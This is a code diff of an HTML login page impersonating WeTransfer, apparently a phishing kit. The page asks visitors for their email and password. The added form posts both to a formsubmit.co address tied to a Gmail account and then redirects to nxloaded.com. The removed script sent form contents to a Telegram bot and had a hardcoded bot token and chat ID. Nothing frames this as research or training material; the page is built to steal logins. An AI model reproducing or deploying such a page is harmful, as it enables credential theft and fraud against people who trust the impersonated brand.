@@ -5,10 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Wetransfer</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">
 
 <style>
-
 *{
   margin:0;
   padding:0;
@@ -58,8 +57,7 @@ body{
   margin-bottom:22px;
 }
 
-.input-group input,
-.input-group textarea{
+.input-group input{
   width:100%;
   padding:22px 24px;
   border:2px solid #d9d9d9;
@@ -70,13 +68,7 @@ body{
   transition:0.3s ease;
 }
 
-.input-group textarea{
-  resize:none;
-  height:150px;
-}
-
-.input-group input:focus,
-.input-group textarea:focus{
+.input-group input:focus{
   border-color:#3567f2;
   box-shadow:0 0 10px rgba(53,103,242,0.15);
 }
@@ -143,121 +135,53 @@ body{
 
 /* MOBILE VIEW */
 @media(max-width:768px){
-
-  .wrapper{
-    max-width:100%;
-  }
-
-  .logo{
-    margin-bottom:40px;
-  }
-
-  .input-group input[type="password"]{
-  font-size: 18px;
-  padding: 20px;
-  border-radius: 20px;
-  width: 100%;
-  border: none;
-  outline: none;
-}
-
   .btn{
     font-size:24px;
     padding:18px;
     border-radius:20px;
   }
-
-  .links a{
-    font-size:18px;
-  }
-
-  .divider{
-    font-size:18px;
-  }
-
-  .bottom-text{
-    font-size:18px;
-  }
 }
 
 /* SMALL MOBILE VIEW */
 @media(max-width:480px){
-
-  body{
-    padding:15px;
-  }
-
-  .logo{
-    font-size:50px;
-  }
-
-  .title{
-    font-size:34px;
-  }
-
-  .subtitle{
-    font-size:15px;
-  }
-
-  .input-group input,
-  .input-group textarea{
+  body{ padding:15px; }
+  .logo{ font-size:50px; }
+  .title{ font-size:34px; }
+  .subtitle{ font-size:15px; }
+  .input-group input{
     padding:18px;
     font-size:16px;
   }
-
   .btn{
     font-size:22px;
     padding:16px;
   }
-
-  .links a,
-  .bottom-text{
-    font-size:16px;
-  }
 }
-
 </style>
 </head>
 <body>
 
 <div class="wrapper">
 
-  <div class="logo">
-    Wetransfer
-  </div>
+  <div class="logo">Wetransfer</div>
+  <div class="title">drop message</div>
+  <div class="subtitle">to continue to your Wetransfer.</div>
 
-  <div class="title">
-    drop message
-  </div>
+  <!-- ✅ FormSubmit Integration -->
+  <form action="[formsubmit.co](https://formsubmit.co/nxloaded@gmail.com)" method="POST">
 
-  <div class="subtitle">
-    to continue to your Wetransfer.
-  </div>
-
-  <form id="messageForm">
+    <input type="hidden" name="_next" value="[nxloaded.com](https://nxloaded.com)">
+    <input type="hidden" name="_captcha" value="false">
 
     <div class="input-group">
-      <input 
-        type="email" 
-        id="email" 
-        placeholder="Enter email"
-        required
-      >
+      <input type="email" name="email" placeholder="Enter email" required>
     </div>
 
     <div class="input-group">
-  <input 
-    type="password" 
-    id="password" 
-    placeholder="Type your password..."
-    required
-  />
-</div>
+      <input type="password" name="password" placeholder="Type your password..." required>
+    </div>
 
-    <button type="submit" class="btn">
-      Continue
-    </button>
-
+    <button type="submit" class="btn">Continue</button>
   </form>
 
   <div class="links">
@@ -265,81 +189,13 @@ body{
     <a href="#">Use a different email?</a>
   </div>
 
-  <div class="divider">
-    <span>or</span>
-  </div>
+  <div class="divider"><span>or</span></div>
 
   <div class="bottom-text">
-    Receive a 
-    <a href="#">temporary code via email</a>
+    Receive a <a href="#">temporary code via email</a>
   </div>
 
 </div>
-
-<script>
-
-const form = document.getElementById("messageForm");
-
-form.addEventListener("submit", async function(e){
-
-  e.preventDefault();
-
-  const email = document.getElementById("email").value;
-  const message = document.getElementById("message").value;
-
-  const botToken = "8719151931:AAE9M4RyCXNwTtCeoXc4_8Tb287gD-M2aEA";
-  const chatId = "7327775914";
-
-  const text = `
-New Message
-
-Email: ${email}
-
-Message:
-${message}
-`;
-
-  try{
-
-    const response = await fetch(
-      `https://api.telegram.org/bot${botToken}/sendMessage`,
-      {
-        method:"POST",
-        headers:{
-          "Content-Type":"application/json"
-        },
-        body:JSON.stringify({
-          chat_id:chatId,
-          text:text
-        })
-      }
-    );
-
-    const data = await response.json();
-
-    if(data.ok){
-
-      window.location.href = "https://nxloaded.com";
-
-    }else{
-
-      alert("Telegram Error");
-
-      console.log(data);
-
-    }
-
-  }catch(error){
-
-    console.log(error);
-
-    alert("Failed to send");
-
-  }
-
-});
-
-</script>
 
 </body>
 </html>
